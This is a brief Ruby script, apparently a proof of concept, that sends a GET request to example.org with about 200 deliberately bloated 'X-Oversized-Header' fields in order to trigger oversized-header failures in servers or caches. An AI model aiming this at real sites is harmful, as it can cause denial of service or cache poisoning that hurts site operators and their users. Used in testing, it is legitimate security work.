require 'net/http'
uri = URI("https://example.org/index.html")
req = Net::HTTP::Get.new(uri)

num = 200
i = 0

# Setting malicious and irrelevant headers fields for creating an oversized header
until i > num  do
	req["X-Oversized-Header-#{i}"] = "Big-Value-0000000000000000000000000000000000"
	i +=1;
end

res = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => uri.scheme == 'https') {|http|
	http.request(req)
}